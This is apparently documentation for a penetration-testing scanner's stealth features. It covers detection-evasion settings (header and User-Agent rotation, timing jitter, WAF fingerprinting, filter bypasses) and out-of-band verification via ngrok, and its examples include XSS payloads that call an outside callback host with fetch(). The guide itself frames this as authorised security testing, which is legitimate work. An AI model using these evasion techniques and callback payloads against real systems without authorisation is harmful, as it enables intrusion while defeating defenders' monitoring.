# Stealth Features Guide

## Overview

Megido's vulnerability scanner now includes advanced stealth capabilities to evade detection systems, mimic real browser traffic, and improve exploitation success rates. These features help security professionals conduct more realistic and effective penetration tests.

## Features

### 1. Stealth Engine

The Stealth Engine provides sophisticated traffic mimicking and evasion capabilities:

#### Randomized User-Agent Rotation
- Over 20 authentic browser User-Agents
- Includes Chrome, Firefox, Safari, and Edge
- Covers Windows, macOS, and Linux platforms
- Automatically rotates per request

#### HTTP Header Randomization
- Randomized `Accept` headers matching real browsers
- Varied `Accept-Language` headers (en-US, en-GB, etc.)
- Dynamic `Accept-Encoding` headers (gzip, br, zstd)
- Browser-specific headers (Sec-Fetch-*, Sec-CH-UA-*)
- Realistic `DNT` and `Upgrade-Insecure-Requests` headers

#### Request Timing & Jitter
- Configurable delay ranges (default: 0.5-3.0 seconds)
- Random jitter to avoid pattern detection
- Intelligent delay management between requests
- Prevents rate-limiting and detection

#### Session Management
- Automatic session ID rotation
- Realistic session cookie generation
- Common tracking cookies (GA, GAID, etc.)
- Domain-specific cookie patterns

#### Parameter Manipulation
- URL parameter order randomization
- Prevents signature-based detection
- Maintains functionality while varying patterns

### 2. Adaptive Payload Engine

The Adaptive Payload Engine intelligently selects and generates payloads based on context:

#### Context Detection
- Automatic injection context identification
- Supports: HTML, JSON, JavaScript, XML, SVG, URL contexts
- Detects attributes, event handlers, and script blocks
- Analyzes response structure

#### Intelligent Payload Generation
- Context-aware payload selection
- Multiple encoding variations (URL, HTML entities, Base64, Unicode)
- Database-specific SQL injection payloads
- OS-specific command injection payloads

#### Response Analysis
- Reflection point detection
- Encoding detection (HTML entities, URL encoding)
- Filter identification and bypass suggestions
- WAF fingerprinting

#### Filter Evasion
- Automatic bypass technique suggestions
- Case variation support
- Alternative tag/function recommendations
- Multi-encoding attacks

### 3. Callback Verification System

Out-of-band (OOB) verification for exploitation proof:

#### Local Callback Server
- Built-in HTTP server for callback reception
- Automatic interaction logging
- Timestamp and metadata capture
- Thread-safe operation

#### ngrok Integration
- Seamless ngrok tunnel support
- Automatic public URL exposure
- Auth token configuration
- Tunnel health monitoring

#### External Service Support
- Burp Collaborator compatibility
- Interactsh integration
- Custom webhook endpoints
- Flexible endpoint configuration

#### Callback Verification
- Unique payload identifier tracking
- Timeout-based polling
- Interaction correlation
- Proof-of-exploitation evidence

## Configuration

### Basic Usage

```python
from scanner.scan_engine import ScanEngine

# Create scanner with stealth enabled
config = {
    'enable_stealth': True,
    'stealth_min_delay': 1.0,
    'stealth_max_delay': 3.0,
    'stealth_jitter': 0.5,
    'stealth_session_rotation': True,
}

engine = ScanEngine()
findings = engine.scan('https://target.com', config)
```

### Advanced Configuration

```python
# Full stealth configuration
config = {
    # Stealth settings
    'enable_stealth': True,
    'stealth_min_delay': 1.0,          # Minimum delay between requests (seconds)
    'stealth_max_delay': 5.0,          # Maximum delay between requests (seconds)
    'stealth_jitter': 1.0,             # Random jitter range (+/- seconds)
    'stealth_session_rotation': True,  # Rotate session IDs
    
    # Callback verification
    'enable_callback_verification': True,
    'callback_endpoint': None,         # External endpoint (optional)
    'callback_use_ngrok': True,        # Use ngrok for local callbacks
    'callback_ngrok_token': 'your_token_here',
    'callback_port': 8888,
    
    # Standard settings
    'verify_ssl': False,
    'timeout': 30,
}
```

### Environment Variables

You can also configure via environment variables:

```bash
# Stealth settings
export SCANNER_STEALTH_ENABLED=true
export SCANNER_MIN_DELAY=1.0
export SCANNER_MAX_DELAY=3.0
export SCANNER_JITTER=0.5

# Callback settings
export SCANNER_CALLBACK_ENABLED=true
export SCANNER_CALLBACK_ENDPOINT=https://your-callback.com
export SCANNER_CALLBACK_USE_NGROK=true
export SCANNER_CALLBACK_NGROK_TOKEN=your_token_here
export SCANNER_CALLBACK_PORT=8888
```

## Using ngrok for Callback Verification

### Step 1: Install ngrok

```bash
# Download from https://ngrok.com/download

# Linux/macOS
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

# Or use package managers
# macOS
brew install ngrok

# Windows (Chocolatey)
choco install ngrok
```

### Step 2: Sign Up and Get Auth Token

1. Sign up at https://dashboard.ngrok.com/signup
2. Get your auth token from https://dashboard.ngrok.com/get-started/your-authtoken
3. Configure ngrok:

```bash
ngrok config add-authtoken YOUR_AUTH_TOKEN_HERE
```

### Step 3: Use with Megido Scanner

#### Method 1: Automatic (Recommended)

```python
from scanner.callback_manager import CallbackManager

# CallbackManager will automatically start ngrok
manager = CallbackManager()
callback_url = manager.start_callback_server(use_ngrok=True)

print(f"Callback URL: {callback_url}")
# Use callback_url in your payloads
```

#### Method 2: Manual ngrok + Endpoint

```bash
# Terminal 1: Start ngrok manually
ngrok http 8888
# Copy the https URL (e.g., https://abc123.ngrok.io)
```

```python
# Terminal 2: Run scanner with endpoint
from scanner.callback_manager import CallbackManager

manager = CallbackManager(port=8888)
manager.set_external_endpoint('https://abc123.ngrok.io')
manager.start_callback_server(use_ngrok=False)
```

### Step 4: Generate Callback Payloads

```python
from scanner.adaptive_payload_engine import AdaptivePayloadEngine

engine = AdaptivePayloadEngine()

# Generate XSS payloads with callback
payloads = engine.generate_adaptive_payloads(
    vuln_type='xss',
    context='html',
    callback_url=callback_url
)

# Example payloads generated:
# <script>fetch("https://abc123.ngrok.io/xyz123")</script>
# <img src=x onerror=fetch("https://abc123.ngrok.io/xyz123")>
```

### Step 5: Verify Callbacks

```python
# Wait for callback and verify
result = manager.verify_callback(
    payload_id='xyz123',
    timeout=30
)

if result['verified']:
    print("✓ Exploitation confirmed!")
    print(f"Callback received after {result['time_elapsed']:.2f}s")
    print(f"Interaction: {result['interaction']}")
else:
    print("✗ No callback received")
```

## Alternative: localtunnel

If you prefer localtunnel over ngrok:

```bash
# Install localtunnel
npm install -g localtunnel

# Start tunnel
lt --port 8888 --subdomain my-megido-callback
# URL: https://my-megido-callback.loca.lt
```

Then use the localtunnel URL as your callback endpoint.

## Usage Examples

### Example 1: Basic Stealth Scan

```python
from scanner.scan_engine import ScanEngine

engine = ScanEngine()

# Scan with stealth enabled
findings = engine.scan('https://target.com', {
    'enable_stealth': True,
    'stealth_min_delay': 2.0,
    'stealth_max_delay': 5.0,
})

print(f"Found {len(findings)} vulnerabilities")
```

### Example 2: Adaptive Payload Testing

```python
from scanner.adaptive_payload_engine import AdaptivePayloadEngine

engine = AdaptivePayloadEngine()

# Test XSS in different contexts
for context in ['html', 'attribute', 'javascript', 'json']:
    payloads = engine.generate_adaptive_payloads('xss', context=context)
    print(f"\n{context.upper()} context payloads:")
    for payload in payloads[:3]:
        print(f"  - {payload}")
```

### Example 3: Response Analysis

```python
from scanner.adaptive_payload_engine import AdaptivePayloadEngine
import requests

engine = AdaptivePayloadEngine()

# Inject test payload
test_payload = '<script>alert(TEST)</script>'
response = requests.get(f'https://target.com/search?q={test_payload}')

# Analyze reflection
analysis = engine.analyze_reflection(response.text, test_payload)

if analysis['reflected']:
    print(f"✓ Payload reflected in {analysis['context']} context")
    if analysis['filtered']:
        print("⚠ Filtering detected, try these bypasses:")
        for bypass in analysis['filter_bypasses']:
            print(f"  - {bypass}")
else:
    print("✗ Payload not reflected")
```

### Example 4: Full Stealth Scan with Callbacks

```python
from scanner.scan_engine import ScanEngine
from scanner.callback_manager import CallbackManager

# Start callback server with ngrok
callback_mgr = CallbackManager()
callback_url = callback_mgr.start_callback_server(
    use_ngrok=True,
    ngrok_auth_token='your_token'
)

print(f"Callback server: {callback_url}")

# Scan with stealth and callback verification
try:
    engine = ScanEngine()
    findings = engine.scan('https://target.com', {
        'enable_stealth': True,
        'enable_callback_verification': True,
        'callback_endpoint': callback_url,
        'stealth_min_delay': 1.0,
        'stealth_max_delay': 3.0,
    })
    
    print(f"\nScan complete: {len(findings)} findings")
    
    # Check interactions
    interactions = callback_mgr.get_interactions()
    print(f"Received {len(interactions)} callbacks")
    
finally:
    callback_mgr.stop_callback_server()
```

### Example 5: WAF Detection

```python
from scanner.adaptive_payload_engine import AdaptivePayloadEngine
import requests

engine = AdaptivePayloadEngine()

# Make request and detect WAF
response = requests.get('https://target.com')
waf = engine.detect_waf_signature(
    response.text,
    response.status_code,
    dict(response.headers)
)

if waf:
    print(f"⚠ WAF detected: {waf}")
    print("Consider adjusting stealth settings")
else:
    print("✓ No WAF detected")
```

## Best Practices

### 1. Stealth Configuration

**For High-Security Targets:**
```python
config = {
    'enable_stealth': True,
    'stealth_min_delay': 3.0,      # Slower
    'stealth_max_delay': 8.0,
    'stealth_jitter': 2.0,         # More randomness
    'stealth_session_rotation': True,
}
```

**For Low-Security/Internal Targets:**
```python
config = {
    'enable_stealth': True,
    'stealth_min_delay': 0.5,      # Faster
    'stealth_max_delay': 2.0,
    'stealth_jitter': 0.3,
}
```

### 2. Callback Verification

- Always use HTTPS URLs for callbacks (ngrok provides this)
- Use unique subdomain for each testing session
- Monitor ngrok dashboard for interactions
- Clear interactions between test runs

### 3. Payload Selection

- Start with basic payloads, escalate to advanced
- Use context detection before payload generation
- Analyze responses for filter patterns
- Apply suggested bypasses iteratively

### 4. Rate Limiting

- Adjust delays based on target response times
- Increase delays if you detect rate limiting (429, 503 responses)
- Use session rotation for long scans
- Consider target infrastructure capacity

## Troubleshooting

### ngrok Issues

**Problem:** ngrok not found
```bash
# Verify installation
which ngrok
ngrok version

# If not found, reinstall
brew install ngrok  # macOS
# or download from https://ngrok.com/download
```

**Problem:** ngrok auth token errors
```bash
# Re-configure auth token
ngrok config add-authtoken YOUR_TOKEN

# Verify config
cat ~/.config/ngrok/ngrok.yml
```

**Problem:** Port already in use
```python
# Use different port
manager = CallbackManager(port=9999)
```

### Callback Issues

**Problem:** No callbacks received
- Verify ngrok tunnel is active: `curl https://your-ngrok-url.ngrok.io`
- Check firewall rules on local machine
- Ensure payloads include correct callback URL
- Verify target can make outbound HTTP requests

**Problem:** Callback timeout
```python
# Increase timeout
result = manager.verify_callback(payload_id, timeout=60)
```

### Stealth Issues

**Problem:** Still getting blocked
- Increase delay ranges
- Enable session rotation
- Check if specific headers are flagged
- Consider using residential proxy

**Problem:** Scan too slow
- Decrease delay ranges
- Reduce jitter
- Disable callback verification for detection phase

## Security Considerations

1. **Authorization:** Only test systems you have permission to test
2. **Callback Data:** Callbacks may contain sensitive data, handle securely
3. **ngrok Security:** Free ngrok URLs are public, anyone can access them
4. **Rate Limits:** Respect target system capacity
5. **Logging:** Be careful with logging sensitive payload/response data

## Integration with Existing Tools

### Burp Suite Integration

```python
# Use Burp Collaborator instead of ngrok
manager = CallbackManager()
manager.set_external_endpoint('https://YOUR_ID.burpcollaborator.net')

# Burp will capture interactions
```

### Interactsh Integration

```bash
# Start interactsh client
interactsh-client

# Use generated URL
```

```python
manager = CallbackManager()
manager.set_external_endpoint('https://YOUR_ID.interact.sh')
```

## Advanced Topics

### Custom Payload Encoders

```python
from scanner.stealth_engine import StealthEngine

stealth = StealthEngine()

payload = '<script>alert(1)</script>'

# Try different encodings
encodings = ['url', 'html', 'unicode', 'mixed']
for enc in encodings:
    encoded = stealth.encode_payload(payload, enc)
    print(f"{enc}: {encoded}")
```

### Multi-Encoded Payloads

```python
from scanner.adaptive_payload_engine import AdaptivePayloadEngine

engine = AdaptivePayloadEngine()

payload = '<script>alert(1)</script>'
variants = engine.generate_multi_encoded_payloads(payload)

print(f"Generated {len(variants)} variants:")
for variant in variants:
    print(f"  - {variant[:50]}...")
```

### Session Persistence

```python
from scanner.stealth_engine import StealthEngine

stealth = StealthEngine(enable_session_rotation=False)

# Same session across multiple requests
for i in range(5):
    headers = stealth.get_randomized_headers()
    cookies = stealth.get_session_cookies('target.com')
    # Use same session
```

## Resources

- ngrok Documentation: https://ngrok.com/docs
- localtunnel: https://localtunnel.github.io/www/
- Burp Collaborator: https://portswigger.net/burp/documentation/collaborator
- Interactsh: https://github.com/projectdiscovery/interactsh
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

## Support

For issues or questions:
1. Check this documentation
2. Review error logs
3. Test with minimal configuration
4. Open GitHub issue with details

---

**Version:** 1.0  
**Last Updated:** 2026-02-15
